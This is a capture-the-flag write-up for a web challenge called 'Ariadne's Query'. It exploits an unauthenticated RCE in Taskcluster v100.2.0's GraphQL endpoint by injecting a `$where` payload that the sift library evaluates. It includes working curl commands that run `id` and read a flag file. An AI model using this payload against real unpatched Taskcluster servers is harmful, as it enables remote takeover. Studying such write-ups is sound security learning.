# 31. Ariadne's Query

**Author**: fudgesupreme

**Category**: Web

**Difficulty**: Hard

## Description

With the whereabouts of Daedalus secured, you have just started to make your way towards the exit when you find a reference to another server owned by Minos. To ensure that no trace of the Minotaur is left, You decide to break in.

## Solve

- For This Challenge you were given a `Taskcluster` Web Instance which is basically a tool used by Mozzila for Integration
- On further poking around the endpoints I found there was `/graphql` endpoint present.

<img width="1748" height="806" alt="image" src="https://github.com/user-attachments/assets/df5f0050-9a1c-40d0-bf1c-1594dc3c228a" />

- GraphQL is basically a query language for APIs where instead of hitting different URLs for different data, you send one endpoint `/graphql` a query describing exactly what you want, and the server returns just that.
- This is usually ok, as long as there are safe guards present.
- So now curious enough as it was present and taskcluster was a publicly available tool so i looked up `taskcluster graphql vuln`.
- The first link that popped up was a [report](https://hackerone.com/reports/3782701) that said there was an unauthenticated RCE vulnerability present.
- Now `RCE` basically stands for `Remote Code Execution`, which just means that u can execute code on a server remotely.
- Now finding that in any challenge is considered **the holy grail** so i looked into what it said so apparently taskcluster prior to version 100.3.0 were all affected.
- so if you looked closely in the bottom left corner it showed the version of taskcluster 

<img width="1864" height="875" alt="image" src="https://github.com/user-attachments/assets/fd78cd04-9970-44c8-bec0-5e3f261780ae" />

- Now the challenge was on Taskcluster v100.2.0 which was vulnerable.
- the Report basically said that one of the graphql query arguement `filter` passes our input directly into a npm library called `sift`
- the sift library compiles the `$where` string into code.
- The Report contained a PoC aswell showcasing the whole vulnerability.
- So I used the same to test the challenge website :
```bash
curl -s https://ariadne-query.labyrinthctf.live/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"query($f:JSON){expandScopes(scopes:[\"assume:anonymous\"],filter:$f)}","variables":{"f":{"$where":"(function(){throw new Error(process.getBuiltinModule(\"child_process\").execSync(\"id\").toString())})()"}}}'
```
- on executing the following command which basically does the exact same thing we mentioned above which take a query and pass it to filter which gives it directly to the `sift` library and the `$where` string gets converted into code which is executed, I got the following output of the above payload :
```
{"errors":[{"message":"uid=1000(node) gid=1000(node) groups=1000(node),1000(node)\n","locations":[{"line":1,"column":16}],"path":["expandScopes"]}],"data":null}
```
- As u can see we passed the `id` command in the payload and got back the output in the error message.
- Now that we have command execution i looked around and found out that the flag was present in `/flag/flag.txt`.
```bash
❯ curl -s https://ariadne-query.labyrinthctf.live/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"query($f:JSON){expandScopes(scopes:[\"assume:anonymous\"],filter:$f)}","variables":{"f":{"$where":"(function(){throw new Error(process.getBuiltinModule(\"child_process\").execSync(\"cat /flag/flag.txt\").toString())})()"}}}'
{"errors":[{"message":"labyrinth{g00d_b0y}\n","locations":[{"line":1,"column":16}],"path":["expandScopes"]}],"data":null}
```

## Flag :
```
labyrinth{g00d_b0y}
```
